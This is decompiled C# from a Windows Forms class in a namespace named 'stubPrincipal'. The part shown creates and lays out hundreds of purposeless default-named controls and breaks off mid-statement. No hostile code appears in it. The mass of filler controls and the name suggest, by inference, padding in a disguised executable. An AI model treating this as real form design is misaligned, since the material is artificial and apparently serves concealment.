using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stubPrincipal.My;

namespace stubPrincipal
{
	// Token: 0x0200001D RID: 29
	[DesignerGenerated]
	public class Rubri : Form
	{
		// Token: 0x06000D5D RID: 3421 RVA: 0x000438B4 File Offset: 0x00041AB4
		public Rubri()
		{
			base.Load += this.Rubri_Load;
			this.InitializeComponent();
		}

		// Token: 0x06000D5E RID: 3422 RVA: 0x000438D4 File Offset: 0x00041AD4
		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000D5F RID: 3423 RVA: 0x00043914 File Offset: 0x00041B14
		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			this.PictureBox1 = new PictureBox();
			this.ListView1 = new ListView();
			this.Label1 = new Label();
			this.MonthCalendar1 = new MonthCalendar();
			this.DateTimePicker1 = new DateTimePicker();
			this.DateTimePicker2 = new DateTimePicker();
			this.CheckBox1 = new CheckBox();
			this.Button1 = new Button();
			this.ListBox1 = new ListBox();
			this.NumericUpDown1 = new NumericUpDown();
			this.ProgressBar1 = new ProgressBar();
			this.RadioButton1 = new RadioButton();
			this.TextBox1 = new TextBox();
			this.ToolTip1 = new ToolTip(this.components);
			this.ComboBox1 = new ComboBox();
			this.NotifyIcon1 = new NotifyIcon(this.components);
			this.LinkLabel1 = new LinkLabel();
			this.CheckedListBox1 = new CheckedListBox();
			this.ListView2 = new ListView();
			this.CheckBox2 = new CheckBox();
			this.MaskedTextBox1 = new MaskedTextBox();
			this.CheckBox3 = new CheckBox();
			this.ListView3 = new ListView();
			this.MaskedTextBox2 = new MaskedTextBox();
			this.CheckedListBox2 = new CheckedListBox();
			this.ComboBox2 = new ComboBox();
			this.DateTimePicker3 = new DateTimePicker();
			this.Label2 = new Label();
			this.CheckedListBox3 = new CheckedListBox();
			this.CheckedListBox4 = new CheckedListBox();
			this.CheckedListBox5 = new CheckedListBox();
			this.CheckedListBox6 = new CheckedListBox();
			this.Label3 = new Label();
			this.DateTimePicker4 = new DateTimePicker();
			this.ComboBox3 = new ComboBox();
			this.CheckedListBox7 = new CheckedListBox();
			this.MaskedTextBox3 = new MaskedTextBox();
			this.ListView4 = new ListView();
			this.CheckBox4 = new CheckBox();
			this.MaskedTextBox4 = new MaskedTextBox();
			this.CheckBox5 = new CheckBox();
			this.ListView5 = new ListView();
			this.CheckedListBox8 = new CheckedListBox();
			this.ComboBox4 = new ComboBox();
			this.RadioButton2 = new RadioButton();
			this.ProgressBar2 = new ProgressBar();
			this.Button2 = new Button();
			this.CheckBox6 = new CheckBox();
			this.DateTimePicker5 = new DateTimePicker();
			this.DateTimePicker6 = new DateTimePicker();
			this.MonthCalendar2 = new MonthCalendar();
			this.Label4 = new Label();
			this.ListView6 = new ListView();
			this.PictureBox2 = new PictureBox();
			this.CheckedListBox9 = new CheckedListBox();
			this.CheckedListBox10 = new CheckedListBox();
			this.Label5 = new Label();
			this.DateTimePicker7 = new DateTimePicker();
			this.ComboBox5 = new ComboBox();
			this.CheckedListBox11 = new CheckedListBox();
			this.MaskedTextBox5 = new MaskedTextBox();
			this.ListView7 = new ListView();
			this.CheckBox7 = new CheckBox();
			this.MaskedTextBox6 = new MaskedTextBox();
			this.CheckBox8 = new CheckBox();
			this.ListView8 = new ListView();
			this.CheckedListBox12 = new CheckedListBox();
			this.ComboBox6 = new ComboBox();
			this.RadioButton3 = new RadioButton();
			this.ProgressBar3 = new ProgressBar();
			this.Button3 = new Button();
			this.CheckBox9 = new CheckBox();
			this.DateTimePicker8 = new DateTimePicker();
			this.DateTimePicker9 = new DateTimePicker();
			this.MonthCalendar3 = new MonthCalendar();
			this.Label6 = new Label();
			this.ListView9 = new ListView();
			this.PictureBox3 = new PictureBox();
			this.CheckedListBox13 = new CheckedListBox();
			this.CheckedListBox14 = new CheckedListBox();
			this.Label7 = new Label();
			this.DateTimePicker10 = new DateTimePicker();
			this.ComboBox7 = new ComboBox();
			this.CheckedListBox15 = new CheckedListBox();
			this.MaskedTextBox7 = new MaskedTextBox();
			this.ListView10 = new ListView();
			this.CheckBox10 = new CheckBox();
			this.MaskedTextBox8 = new MaskedTextBox();
			this.CheckBox11 = new CheckBox();
			this.ListView11 = new ListView();
			this.CheckedListBox16 = new CheckedListBox();
			this.ComboBox8 = new ComboBox();
			this.RadioButton4 = new RadioButton();
			this.ProgressBar4 = new ProgressBar();
			this.Button4 = new Button();
			this.CheckBox12 = new CheckBox();
			this.DateTimePicker11 = new DateTimePicker();
			this.DateTimePicker12 = new DateTimePicker();
			this.MonthCalendar4 = new MonthCalendar();
			this.Label8 = new Label();
			this.ListView12 = new ListView();
			this.PictureBox4 = new PictureBox();
			this.CheckedListBox17 = new CheckedListBox();
			this.Label9 = new Label();
			this.DateTimePicker13 = new DateTimePicker();
			this.ComboBox9 = new ComboBox();
			this.CheckedListBox18 = new CheckedListBox();
			this.ListView13 = new ListView();
			this.MaskedTextBox9 = new MaskedTextBox();
			this.ListView14 = new ListView();
			this.CheckedListBox19 = new CheckedListBox();
			this.ComboBox10 = new ComboBox();
			this.RadioButton5 = new RadioButton();
			this.ProgressBar5 = new ProgressBar();
			this.DateTimePicker14 = new DateTimePicker();
			this.MonthCalendar5 = new MonthCalendar();
			this.PictureBox5 = new PictureBox();
			this.CheckedListBox20 = new CheckedListBox();
			this.CheckedListBox21 = new CheckedListBox();
			this.Label10 = new Label();
			this.DateTimePicker15 = new DateTimePicker();
			this.ComboBox11 = new ComboBox();
			this.CheckedListBox22 = new CheckedListBox();
			this.MaskedTextBox10 = new MaskedTextBox();
			this.ListView15 = new ListView();
			this.CheckBox13 = new CheckBox();
			this.MaskedTextBox11 = new MaskedTextBox();
			this.CheckBox14 = new CheckBox();
			this.ListView16 = new ListView();
			this.CheckedListBox23 = new CheckedListBox();
			this.ComboBox12 = new ComboBox();
			this.RadioButton6 = new RadioButton();
			this.ProgressBar6 = new ProgressBar();
			this.Button5 = new Button();
			this.CheckBox15 = new CheckBox();
			this.DateTimePicker16 = new DateTimePicker();
			this.DateTimePicker17 = new DateTimePicker();
			this.MonthCalendar6 = new MonthCalendar();
			this.Label11 = new Label();
			this.ListView17 = new ListView();
			this.PictureBox6 = new PictureBox();
			this.CheckedListBox24 = new CheckedListBox();
			this.CheckedListBox25 = new CheckedListBox();
			this.Label12 = new Label();
			this.DateTimePicker18 = new DateTimePicker();
			this.ComboBox13 = new ComboBox();
			this.CheckedListBox26 = new CheckedListBox();
			this.MaskedTextBox12 = new MaskedTextBox();
			this.ListView18 = new ListView();
			this.CheckBox16 = new CheckBox();
			this.MaskedTextBox13 = new MaskedTextBox();
			this.CheckBox17 = new CheckBox();
			this.ListView19 = new ListView();
			this.CheckedListBox27 = new CheckedListBox();
			this.ComboBox14 = new ComboBox();
			this.RadioButton7 = new RadioButton();
			this.ProgressBar7 = new ProgressBar();
			this.Button6 = new Button();
			this.CheckBox18 = new CheckBox();
			this.DateTimePicker19 = new DateTimePicker();
			this.DateTimePicker20 = new DateTimePicker();
			this.MonthCalendar7 = new MonthCalendar();
			this.Label13 = new Label();
			this.ListView20 = new ListView();
			this.PictureBox7 = new PictureBox();
			this.CheckedListBox28 = new CheckedListBox();
			this.CheckedListBox29 = new CheckedListBox();
			this.Label14 = new Label();
			this.DateTimePicker21 = new DateTimePicker();
			this.ComboBox15 = new ComboBox();
			this.CheckedListBox30 = new CheckedListBox();
			this.MaskedTextBox14 = new MaskedTextBox();
			this.ListView21 = new ListView();
			this.CheckBox19 = new CheckBox();
			this.MaskedTextBox15 = new MaskedTextBox();
			this.CheckBox20 = new CheckBox();
			this.ListView22 = new ListView();
			this.CheckedListBox31 = new CheckedListBox();
			this.ComboBox16 = new ComboBox();
			this.RadioButton8 = new RadioButton();
			this.ProgressBar8 = new ProgressBar();
			this.Button7 = new Button();
			this.CheckBox21 = new CheckBox();
			this.DateTimePicker22 = new DateTimePicker();
			this.DateTimePicker23 = new DateTimePicker();
			this.MonthCalendar8 = new MonthCalendar();
			this.Label15 = new Label();
			this.ListView23 = new ListView();
			this.PictureBox8 = new PictureBox();
			this.CheckedListBox32 = new CheckedListBox();
			this.Label16 = new Label();
			this.DateTimePicker24 = new DateTimePicker();
			this.ComboBox17 = new ComboBox();
			this.CheckedListBox33 = new CheckedListBox();
			this.ListView24 = new ListView();
			this.MaskedTextBox16 = new MaskedTextBox();
			this.ListView25 = new ListView();
			this.CheckedListBox34 = new CheckedListBox();
			this.ComboBox18 = new ComboBox();
			this.RadioButton9 = new RadioButton();
			this.ProgressBar9 = new ProgressBar();
			this.DateTimePicker25 = new DateTimePicker();
			this.MonthCalendar9 = new MonthCalendar();
			this.PictureBox9 = new PictureBox();
			this.CheckedListBox35 = new CheckedListBox();
			this.CheckedListBox36 = new CheckedListBox();
			this.Label17 = new Label();
			this.DateTimePicker26 = new DateTimePicker();
			this.ComboBox19 = new ComboBox();
			this.CheckedListBox37 = new CheckedListBox();
			this.MaskedTextBox17 = new MaskedTextBox();
			this.ListView26 = new ListView();
			this.CheckBox22 = new CheckBox();
			this.MaskedTextBox18 = new MaskedTextBox();
			this.CheckBox23 = new CheckBox();
			this.ListView27 = new ListView();
			this.CheckedListBox38 = new CheckedListBox();
			this.ComboBox20 = new ComboBox();
			this.RadioButton10 = new RadioButton();
			this.ProgressBar10 = new ProgressBar();
			this.Button8 = new Button();
			this.CheckBox24 = new CheckBox();
			this.DateTimePicker27 = new DateTimePicker();
			this.DateTimePicker28 = new DateTimePicker();
			this.MonthCalendar10 = new MonthCalendar();
			this.Label18 = new Label();
			this.ListView28 = new ListView();
			this.PictureBox10 = new PictureBox();
			this.CheckedListBox39 = new CheckedListBox();
			this.CheckedListBox40 = new CheckedListBox();
			this.Label19 = new Label();
			this.DateTimePicker29 = new DateTimePicker();
			this.ComboBox21 = new ComboBox();
			this.CheckedListBox41 = new CheckedListBox();
			this.MaskedTextBox19 = new MaskedTextBox();
			this.ListView29 = new ListView();
			this.CheckBox25 = new CheckBox();
			this.MaskedTextBox20 = new MaskedTextBox();
			this.CheckBox26 = new CheckBox();
			this.ListView30 = new ListView();
			this.CheckedListBox42 = new CheckedListBox();
			this.ComboBox22 = new ComboBox();
			this.RadioButton11 = new RadioButton();
			this.ProgressBar11 = new ProgressBar();
			this.Button9 = new Button();
			this.CheckBox27 = new CheckBox();
			this.DateTimePicker30 = new DateTimePicker();
			this.DateTimePicker31 = new DateTimePicker();
			this.MonthCalendar11 = new MonthCalendar();
			this.Label20 = new Label();
			this.ListView31 = new ListView();
			this.PictureBox11 = new PictureBox();
			this.CheckedListBox43 = new CheckedListBox();
			this.CheckedListBox44 = new CheckedListBox();
			this.Label21 = new Label();
			this.DateTimePicker32 = new DateTimePicker();
			this.ComboBox23 = new ComboBox();
			this.CheckedListBox45 = new CheckedListBox();
			this.MaskedTextBox21 = new MaskedTextBox();
			this.ListView32 = new ListView();
			this.CheckBox28 = new CheckBox();
			this.MaskedTextBox22 = new MaskedTextBox();
			this.CheckBox29 = new CheckBox();
			this.ListView33 = new ListView();
			this.CheckedListBox46 = new CheckedListBox();
			this.ComboBox24 = new ComboBox();
			this.RadioButton12 = new RadioButton();
			this.ProgressBar12 = new ProgressBar();
			this.Button10 = new Button();
			this.CheckBox30 = new CheckBox();
			this.DateTimePicker33 = new DateTimePicker();
			this.DateTimePicker34 = new DateTimePicker();
			this.MonthCalendar12 = new MonthCalendar();
			this.Label22 = new Label();
			this.ListView34 = new ListView();
			this.PictureBox12 = new PictureBox();
			this.CheckedListBox47 = new CheckedListBox();
			this.Label23 = new Label();
			this.DateTimePicker35 = new DateTimePicker();
			this.ComboBox25 = new ComboBox();
			this.CheckedListBox48 = new CheckedListBox();
			this.ListView35 = new ListView();
			this.MaskedTextBox23 = new MaskedTextBox();
			this.CheckBox31 = new CheckBox();
			this.ListView36 = new ListView();
			this.CheckedListBox49 = new CheckedListBox();
			this.ComboBox26 = new ComboBox();
			this.RadioButton13 = new RadioButton();
			this.ProgressBar13 = new ProgressBar();
			this.DateTimePicker36 = new DateTimePicker();
			this.MonthCalendar13 = new MonthCalendar();
			this.PictureBox13 = new PictureBox();
			this.CheckedListBox50 = new CheckedListBox();
			this.CheckedListBox51 = new CheckedListBox();
			this.Label24 = new Label();
			this.DateTimePicker37 = new DateTimePicker();
			this.ComboBox27 = new ComboBox();
			this.CheckedListBox52 = new CheckedListBox();
			this.MaskedTextBox24 = new MaskedTextBox();
			this.ListView37 = new ListView();
			this.CheckBox32 = new CheckBox();
			this.MaskedTextBox25 = new MaskedTextBox();
			this.CheckBox33 = new CheckBox();
			this.ListView38 = new ListView();
			this.CheckedListBox53 = new CheckedListBox();
			this.ComboBox28 = new ComboBox();
			this.RadioButton14 = new RadioButton();
			this.ProgressBar14 = new ProgressBar();
			this.Button11 = new Button();
			this.CheckBox34 = new CheckBox();
			this.DateTimePicker38 = new DateTimePicker();
			this.DateTimePicker39 = new DateTimePicker();
			this.MonthCalendar14 = new MonthCalendar();
			this.Label25 = new Label();
			this.ListView39 = new ListView();
			this.PictureBox14 = new PictureBox();
			this.CheckedListBox54 = new CheckedListBox();
			this.CheckedListBox55 = new CheckedListBox();
			this.Label26 = new Label();
			this.DateTimePicker40 = new DateTimePicker();
			this.ComboBox29 = new ComboBox();
			this.CheckedListBox56 = new CheckedListBox();
			this.MaskedTextBox26 = new MaskedTextBox();
			this.ListView40 = new ListView();
			this.CheckBox35 = new CheckBox();
			this.MaskedTextBox27 = new MaskedTextBox();
			this.CheckBox36 = new CheckBox();
			this.ListView41 = new ListView();
			this.CheckedListBox57 = new CheckedListBox();
			this.ComboBox30 = new ComboBox();
			this.RadioButton15 = new RadioButton();
			this.ProgressBar15 = new ProgressBar();
			this.Button12 = new Button();
			this.CheckBox37 = new CheckBox();
			this.DateTimePicker41 = new DateTimePicker();
			this.DateTimePicker42 = new DateTimePicker();
			this.MonthCalendar15 = new MonthCalendar();
			this.Label27 = new Label();
			this.ListView42 = new ListView();
			this.PictureBox15 = new PictureBox();
			this.CheckedListBox58 = new CheckedListBox();
			this.CheckedListBox59 = new CheckedListBox();
			this.Label28 = new Label();
			this.DateTimePicker43 = new DateTimePicker();
			this.ComboBox31 = new ComboBox();
			this.CheckedListBox60 = new CheckedListBox();
			this.MaskedTextBox28 = new MaskedTextBox();
			this.ListView43 = new ListView();
			this.CheckBox38 = new CheckBox();
			this.MaskedTextBox29 = new MaskedTextBox();
			this.CheckBox39 = new CheckBox();
			this.ListView44 = new ListView();
			this.CheckedListBox61 = new CheckedListBox();
			this.LinkLabel2 = new LinkLabel();
			this.ComboBox32 = new ComboBox();
			this.RadioButton16 = new RadioButton();
			this.ProgressBar16 = new ProgressBar();
			this.NumericUpDown2 = new NumericUpDown();
			this.ListBox2 = new ListBox();
			this.Button13 = new Button();
			this.CheckBox40 = new CheckBox();
			this.DateTimePicker44 = new DateTimePicker();
			this.DateTimePicker45 = new DateTimePicker();
			this.MonthCalendar16 = new MonthCalendar();
			this.Label29 = new Label();
			this.ListView45 = new ListView();
			this.PictureBox16 = new PictureBox();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			((ISupportInitialize)this.NumericUpDown1).BeginInit();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			((ISupportInitialize)this.PictureBox3).BeginInit();
			((ISupportInitialize)this.PictureBox4).BeginInit();
			((ISupportInitialize)this.PictureBox5).BeginInit();
			((ISupportInitialize)this.PictureBox6).BeginInit();
			((ISupportInitialize)this.PictureBox7).BeginInit();
			((ISupportInitialize)this.PictureBox8).BeginInit();
			((ISupportInitialize)this.PictureBox9).BeginInit();
			((ISupportInitialize)this.PictureBox10).BeginInit();
			((ISupportInitialize)this.PictureBox11).BeginInit();
			((ISupportInitialize)this.PictureBox12).BeginInit();
			((ISupportInitialize)this.PictureBox13).BeginInit();
			((ISupportInitialize)this.PictureBox14).BeginInit();
			((ISupportInitialize)this.PictureBox15).BeginInit();
			((ISupportInitialize)this.NumericUpDown2).BeginInit();
			((ISupportInitialize)this.PictureBox16).BeginInit();
			base.SuspendLayout();
			this.PictureBox1.Location = new Point(345, 242);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new Size(100, 50);
			this.PictureBox1.TabIndex = 0;
			this.PictureBox1.TabStop = false;
			this.ListView1.HideSelection = false;
			this.ListView1.Location = new Point(631, 92);
			this.ListView1.Name = "ListView1";
			this.ListView1.Size = new Size(8, 8);
			this.ListView1.TabIndex = 1;
			this.ListView1.UseCompatibleStateImageBehavior = false;
			this.Label1.AutoSize = true;
			this.Label1.Location = new Point(584, 217);
			this.Label1.Name = "Label1";
			this.Label1.Size = new Size(39, 13);
			this.Label1.TabIndex = 2;
			this.Label1.Text = "Label1";
			this.MonthCalendar1.Location = new Point(73, 169);
			this.MonthCalendar1.Name = "MonthCalendar1";
			this.MonthCalendar1.TabIndex = 3;
			this.DateTimePicker1.Location = new Point(491, 246);
			this.DateTimePicker1.Name = "DateTimePicker1";
			this.DateTimePicker1.Size = new Size(200, 20);
			this.DateTimePicker1.TabIndex = 4;
			this.DateTimePicker2.Location = new Point(426, 136);
			this.DateTimePicker2.Name = "DateTimePicker2";
			this.DateTimePicker2.Size = new Size(200, 20);
			this.DateTimePicker2.TabIndex = 5;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Location = new Point(464, 217);
			this.CheckBox1.Name = "CheckBox1";
			this.CheckBox1.Size = new Size(81, 17);
			this.CheckBox1.TabIndex = 6;
			this.CheckBox1.Text = "CheckBox1";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.Button1.Location = new Point(600, 192);
			this.Button1.Name = "Button1";
			this.Button1.Size = new Size(75, 23);
			this.Button1.TabIndex = 7;
			this.Button1.Text = "Button1";
			this.Button1.UseVisualStyleBackColor = true;
			this.ListBox1.FormattingEnabled = true;
			this.ListBox1.Location = new Point(414, 365);
			this.ListBox1.Name = "ListBox1";
			this.ListBox1.Size = new Size(120, 95);
			this.ListBox1.TabIndex = 8;
			this.NumericUpDown1.Location = new Point(300, 362);
			this.NumericUpDown1.Name = "NumericUpDown1";
			this.NumericUpDown1.Size = new Size(120, 20);
			this.NumericUpDown1.TabIndex = 9;
			this.ProgressBar1.Location = new Point(239, 235);
			this.ProgressBar1.Name = "ProgressBar1";
			this.ProgressBar1.Size = new Size(100, 23);
			this.ProgressBar1.TabIndex = 10;
			this.RadioButton1.AutoSize = true;
			this.RadioButton1.Location = new Point(319, 250);
			this.RadioButton1.Name = "RadioButton1";
			this.RadioButton1.Size = new Size(90, 17);
			this.RadioButton1.TabIndex = 11;
			this.RadioButton1.TabStop = true;
			this.RadioButton1.Text = "RadioButton1";
			this.RadioButton1.UseVisualStyleBackColor = true;
			this.TextBox1.Location = new Point(113, 418);
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.Size = new Size(100, 20);
			this.TextBox1.TabIndex = 12;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Location = new Point(130, 193);
			this.ComboBox1.Name = "ComboBox1";
			this.ComboBox1.Size = new Size(121, 21);
			this.ComboBox1.TabIndex = 13;
			this.NotifyIcon1.Text = "NotifyIcon1";
			this.NotifyIcon1.Visible = true;
			this.LinkLabel1.AutoSize = true;
			this.LinkLabel1.Location = new Point(0, 0);
			this.LinkLabel1.Name = "LinkLabel1";
			this.LinkLabel1.Size = new Size(59, 13);
			this.LinkLabel1.TabIndex = 14;
			this.LinkLabel1.TabStop = true;
			this.LinkLabel1.Text = "LinkLabel1";
			this.CheckedListBox1.FormattingEnabled = true;
			this.CheckedListBox1.Location = new Point(121, 66);
			this.CheckedListBox1.Name = "CheckedListBox1";
			this.CheckedListBox1.Size = new Size(120, 94);
			this.CheckedListBox1.TabIndex = 15;
			this.ListView2.HideSelection = false;
			this.ListView2.Location = new Point(129, 74);
			this.ListView2.Name = "ListView2";
			this.ListView2.Size = new Size(121, 97);
			this.ListView2.TabIndex = 16;
			this.ListView2.UseCompatibleStateImageBehavior = false;
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.Location = new Point(24, 24);
			this.CheckBox2.Name = "CheckBox2";
			this.CheckBox2.Size = new Size(81, 17);
			this.CheckBox2.TabIndex = 17;
			this.CheckBox2.Text = "CheckBox2";
			this.CheckBox2.UseVisualStyleBackColor = true;
			this.MaskedTextBox1.Location = new Point(145, 90);
			this.MaskedTextBox1.Name = "MaskedTextBox1";
			this.MaskedTextBox1.Size = new Size(100, 20);
			this.MaskedTextBox1.TabIndex = 18;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Location = new Point(652, 238);
			this.CheckBox3.Name = "CheckBox3";
			this.CheckBox3.Size = new Size(81, 17);
			this.CheckBox3.TabIndex = 19;
			this.CheckBox3.Text = "CheckBox3";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.ListView3.HideSelection = false;
			this.ListView3.Location = new Point(113, 278);
			this.ListView3.Name = "ListView3";
			this.ListView3.Size = new Size(86, 16);
			this.ListView3.TabIndex = 20;
			this.ListView3.UseCompatibleStateImageBehavior = false;
			this.MaskedTextBox2.Location = new Point(444, 278);
			this.MaskedTextBox2.Name = "MaskedTextBox2";
			this.MaskedTextBox2.Size = new Size(47, 20);
			this.MaskedTextBox2.TabIndex = 21;
			this.CheckedListBox2.FormattingEnabled = true;
			this.CheckedListBox2.Location = new Point(215, 155);
			this.CheckedListBox2.Name = "CheckedListBox2";
			this.CheckedListBox2.Size = new Size(35, 4);
			this.CheckedListBox2.TabIndex = 22;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Location = new Point(345, 155);
			this.ComboBox2.Name = "ComboBox2";
			this.ComboBox2.Size = new Size(33, 21);
			this.ComboBox2.TabIndex = 23;
			this.DateTimePicker3.Location = new Point(361, 266);
			this.DateTimePicker3.Name = "DateTimePicker3";
			this.DateTimePicker3.Size = new Size(25, 20);
			this.DateTimePicker3.TabIndex = 24;
			this.Label2.AutoSize = true;
			this.Label2.Location = new Point(406, 202);
			this.Label2.Name = "Label2";
			this.Label2.Size = new Size(39, 13);
			this.Label2.TabIndex = 25;
			this.Label2.Text = "Label2";
			this.CheckedListBox3.FormattingEnabled = true;
			this.CheckedListBox3.Location = new Point(491, 136);
			this.CheckedListBox3.Name = "CheckedListBox3";
			this.CheckedListBox3.Size = new Size(8, 4);
			this.CheckedListBox3.TabIndex = 26;
			this.CheckedListBox4.FormattingEnabled = true;
			this.CheckedListBox4.Location = new Point(90, 12);
			this.CheckedListBox4.Name = "CheckedListBox4";
			this.CheckedListBox4.Size = new Size(120, 94);
			this.CheckedListBox4.TabIndex = 27;
			this.CheckedListBox5.FormattingEnabled = true;
			this.CheckedListBox5.Location = new Point(97, 37);
			this.CheckedListBox5.Name = "CheckedListBox5";
			this.CheckedListBox5.Size = new Size(120, 94);
			this.CheckedListBox5.TabIndex = 51;
			this.CheckedListBox6.FormattingEnabled = true;
			this.CheckedListBox6.Location = new Point(498, 161);
			this.CheckedListBox6.Name = "CheckedListBox6";
			this.CheckedListBox6.Size = new Size(8, 4);
			this.CheckedListBox6.TabIndex = 50;
			this.Label3.AutoSize = true;
			this.Label3.Location = new Point(413, 227);
			this.Label3.Name = "Label3";
			this.Label3.Size = new Size(39, 13);
			this.Label3.TabIndex = 49;
			this.Label3.Text = "Label3";
			this.DateTimePicker4.Location = new Point(368, 291);
			this.DateTimePicker4.Name = "DateTimePicker4";
			this.DateTimePicker4.Size = new Size(25, 20);
			this.DateTimePicker4.TabIndex = 48;
			this.ComboBox3.FormattingEnabled = true;
			this.ComboBox3.Location = new Point(352, 180);
			this.ComboBox3.Name = "ComboBox3";
			this.ComboBox3.Size = new Size(33, 21);
			this.ComboBox3.TabIndex = 47;
			this.CheckedListBox7.FormattingEnabled = true;
			this.CheckedListBox7.Location = new Point(222, 180);
			this.CheckedListBox7.Name = "CheckedListBox7";
			this.CheckedListBox7.Size = new Size(35, 4);
			this.CheckedListBox7.TabIndex = 46;
			this.MaskedTextBox3.Location = new Point(451, 303);
			this.MaskedTextBox3.Name = "MaskedTextBox3";
			this.MaskedTextBox3.Size = new Size(47, 20);
			this.MaskedTextBox3.TabIndex = 45;
			this.ListView4.HideSelection = false;
			this.ListView4.Location = new Point(120, 303);
			this.ListView4.Name = "ListView4";
			this.ListView4.Size = new Size(86, 16);
			this.ListView4.TabIndex = 44;
			this.ListView4.UseCompatibleStateImageBehavior = false;
			this.CheckBox4.AutoSize = true;
			this.CheckBox4.Location = new Point(659, 263);
			this.CheckBox4.Name = "CheckBox4";
			this.CheckBox4.Size = new Size(81, 17);
			this.CheckBox4.TabIndex = 43;
			this.CheckBox4.Text = "CheckBox4";
			this.CheckBox4.UseVisualStyleBackColor = true;
			this.MaskedTextBox4.Location = new Point(152, 115);
			this.MaskedTextBox4.Name = "MaskedTextBox4";
			this.MaskedTextBox4.Size = new Size(100, 20);
			this.MaskedTextBox4.TabIndex = 42;
			this.CheckBox5.AutoSize = true;
			this.CheckBox5.Location = new Point(31, 49);
			this.CheckBox5.Name = "CheckBox5";
			this.CheckBox5.Size = new Size(81, 17);
			this.CheckBox5.TabIndex = 41;
			this.CheckBox5.Text = "CheckBox5";
			this.CheckBox5.UseVisualStyleBackColor = true;
			this.ListView5.HideSelection = false;
			this.ListView5.Location = new Point(136, 99);
			this.ListView5.Name = "ListView5";
			this.ListView5.Size = new Size(121, 97);
			this.ListView5.TabIndex = 40;
			this.ListView5.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox8.FormattingEnabled = true;
			this.CheckedListBox8.Location = new Point(128, 91);
			this.CheckedListBox8.Name = "CheckedListBox8";
			this.CheckedListBox8.Size = new Size(120, 94);
			this.CheckedListBox8.TabIndex = 39;
			this.ComboBox4.FormattingEnabled = true;
			this.ComboBox4.Location = new Point(137, 218);
			this.ComboBox4.Name = "ComboBox4";
			this.ComboBox4.Size = new Size(121, 21);
			this.ComboBox4.TabIndex = 38;
			this.RadioButton2.AutoSize = true;
			this.RadioButton2.Location = new Point(326, 275);
			this.RadioButton2.Name = "RadioButton2";
			this.RadioButton2.Size = new Size(90, 17);
			this.RadioButton2.TabIndex = 37;
			this.RadioButton2.TabStop = true;
			this.RadioButton2.Text = "RadioButton2";
			this.RadioButton2.UseVisualStyleBackColor = true;
			this.ProgressBar2.Location = new Point(278, 254);
			this.ProgressBar2.Name = "ProgressBar2";
			this.ProgressBar2.Size = new Size(100, 23);
			this.ProgressBar2.TabIndex = 36;
			this.Button2.Location = new Point(607, 217);
			this.Button2.Name = "Button2";
			this.Button2.Size = new Size(75, 23);
			this.Button2.TabIndex = 35;
			this.Button2.Text = "Button2";
			this.Button2.UseVisualStyleBackColor = true;
			this.CheckBox6.AutoSize = true;
			this.CheckBox6.Location = new Point(471, 242);
			this.CheckBox6.Name = "CheckBox6";
			this.CheckBox6.Size = new Size(81, 17);
			this.CheckBox6.TabIndex = 34;
			this.CheckBox6.Text = "CheckBox6";
			this.CheckBox6.UseVisualStyleBackColor = true;
			this.DateTimePicker5.Location = new Point(433, 161);
			this.DateTimePicker5.Name = "DateTimePicker5";
			this.DateTimePicker5.Size = new Size(200, 20);
			this.DateTimePicker5.TabIndex = 33;
			this.DateTimePicker6.Location = new Point(409, 223);
			this.DateTimePicker6.Name = "DateTimePicker6";
			this.DateTimePicker6.Size = new Size(200, 20);
			this.DateTimePicker6.TabIndex = 32;
			this.MonthCalendar2.Location = new Point(73, 72);
			this.MonthCalendar2.Name = "MonthCalendar2";
			this.MonthCalendar2.TabIndex = 31;
			this.Label4.AutoSize = true;
			this.Label4.Location = new Point(591, 242);
			this.Label4.Name = "Label4";
			this.Label4.Size = new Size(39, 13);
			this.Label4.TabIndex = 30;
			this.Label4.Text = "Label4";
			this.ListView6.HideSelection = false;
			this.ListView6.Location = new Point(638, 117);
			this.ListView6.Name = "ListView6";
			this.ListView6.Size = new Size(8, 8);
			this.ListView6.TabIndex = 29;
			this.ListView6.UseCompatibleStateImageBehavior = false;
			this.PictureBox2.Location = new Point(352, 267);
			this.PictureBox2.Name = "PictureBox2";
			this.PictureBox2.Size = new Size(100, 50);
			this.PictureBox2.TabIndex = 28;
			this.PictureBox2.TabStop = false;
			this.CheckedListBox9.FormattingEnabled = true;
			this.CheckedListBox9.Location = new Point(105, 45);
			this.CheckedListBox9.Name = "CheckedListBox9";
			this.CheckedListBox9.Size = new Size(120, 94);
			this.CheckedListBox9.TabIndex = 75;
			this.CheckedListBox10.FormattingEnabled = true;
			this.CheckedListBox10.Location = new Point(506, 169);
			this.CheckedListBox10.Name = "CheckedListBox10";
			this.CheckedListBox10.Size = new Size(8, 4);
			this.CheckedListBox10.TabIndex = 74;
			this.Label5.AutoSize = true;
			this.Label5.Location = new Point(421, 235);
			this.Label5.Name = "Label5";
			this.Label5.Size = new Size(39, 13);
			this.Label5.TabIndex = 73;
			this.Label5.Text = "Label5";
			this.DateTimePicker7.Location = new Point(376, 299);
			this.DateTimePicker7.Name = "DateTimePicker7";
			this.DateTimePicker7.Size = new Size(25, 20);
			this.DateTimePicker7.TabIndex = 72;
			this.ComboBox5.FormattingEnabled = true;
			this.ComboBox5.Location = new Point(360, 188);
			this.ComboBox5.Name = "ComboBox5";
			this.ComboBox5.Size = new Size(33, 21);
			this.ComboBox5.TabIndex = 71;
			this.CheckedListBox11.FormattingEnabled = true;
			this.CheckedListBox11.Location = new Point(230, 188);
			this.CheckedListBox11.Name = "CheckedListBox11";
